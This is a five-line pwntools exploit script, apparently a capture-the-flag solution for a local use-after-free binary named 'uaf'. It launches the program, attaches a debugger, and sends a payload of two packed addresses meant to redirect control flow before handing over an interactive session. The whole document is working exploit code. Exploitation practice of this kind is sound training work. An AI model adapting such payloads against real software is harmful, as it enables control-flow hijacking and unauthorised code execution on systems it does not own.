from pwn import *
p=process("./uaf")
gdb.attach(p)
p.sendline(p64(0x601080+8)+p64(0x400857))
p.interactive();
